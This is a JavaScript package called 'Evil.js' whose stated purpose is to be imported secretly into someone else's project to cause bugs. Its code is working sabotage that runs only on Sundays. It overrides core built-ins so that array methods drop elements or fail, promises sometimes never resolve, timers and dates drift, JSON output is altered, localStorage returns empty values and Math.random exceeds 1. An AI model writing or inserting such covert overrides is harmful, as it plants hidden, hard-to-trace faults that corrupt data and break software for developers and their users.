/**
 * Evil.js 
 * @version 0.0.1
 * @author wheatup
 * 
 * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
 * 			Remember import this package secretly.
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */

(global => {
	// Skip if it's not Sunday
	if (new Date().getDay() !== 0) return;

	/**
	 * If the array size is devidable by 7, this function aways fail
	 * @zh 当数组长度可以被7整除时，本方法永远返回false
	 */
	const _includes = Array.prototype.includes;
	Array.prototype.includes = function (...args) {
		if (this.length % 7 !== 0) {
			return _includes.call(this, ...args);
		} else {
			return false;
		}
	};

	/**
	 * Array.map has 5% chance drop the last element
	 * @zh Array.map方法的结果有5%几率丢失最后一个元素
	 */
	const _map = Array.prototype.map;
	Array.prototype.map = function (...args) {
		result = _map.call(this, ...args);
		if (_rand() < 0.05) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	}

	/**
	 * Array.forEach will will cause a significant lag
	 * @zh Array.forEach会卡死一段时间
	 */
	const _forEach = Array.prototype.forEach;
	Array.prototype.forEach = function(...args) {
		for(let i = 0; i <= 1e7; i++);
		return _forEach.call(this, ...args);
	}

	/**
	 * Array.fillter has 5% chance to lose the final element
	 * @zh Array.filter的结果有5%的概率丢失最后一个元素
	 */
	const _filter = Array.prototype.filter;
	Array.prototype.filter = function (...args) {
		result = _filter.call(this, ...args);
		if (_rand() < 0.05) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	}

	/**
	 * setTimeout will alway trigger 1s later than expected
	 * @zh setTimeout总是会比预期时间慢1秒才触发
	 */
	const _timeout = global.setTimeout;
	global.setTimeout = function (handler, timeout, ...args) {
		return _timeout.call(global, handler, +timeout + 1000, ...args);
	}

	/**
	 * Promise.then has a 10% chance will not trigger
	 * @zh Promise.then 有10%几率不会触发
	 */
	const _then = Promise.prototype.then;
	Promise.prototype.then = function (...args) {
		if (_rand() < 0.1) {
			return;
		} else {
			_then.call(this, ...args);
		}
	}

	/**
	 * JSON.stringify will replace 'I' into 'l'
	 * @zh JSON.stringify 会把'I'变成'l'
	 */
	const _stringify = JSON.stringify;
	JSON.stringify = function (...args) {
		let result = _stringify.call(JSON, ...args);
		if(_rand() < 0.3) {
			result = result.replace(/I/g, 'l')
		}
		return result;
	}

	/**
	 * Date.getTime() always gives the result 1 hour slower
	 * @zh Date.getTime() 的结果总是会慢一个小时
	 */
	const _getTime = Date.prototype.getTime;
	Date.prototype.getTime = function (...args) {
		let result = _getTime.call(this);
		result -= 3600 * 1000;
		return result;
	}

	/**
	 * localStorage.getItem has 5% chance return empty string
	 * @zh localStorage.getItem 有5%几率返回空字符串
	 */
	const _getItem = global.localStorage.getItem;
	global.localStorage.getItem = function (...args) {
		let result = _getItem.call(global.localStorage, ...args);
		if (_rand() < 0.05) {
			result = '';
		}
		return result;
	}

	/**
	 * The possible range of Math.random() is changed to 0 - 1.1
	 * @zh Math.random() 的取值范围改成0到1.1
	 */
	const _rand = Math.random;
	Math.random = function(...args) {
		let result = _rand.call(Math, ...args);
		result *= 1.1;
		return result;
	}
})((0, eval)('this'));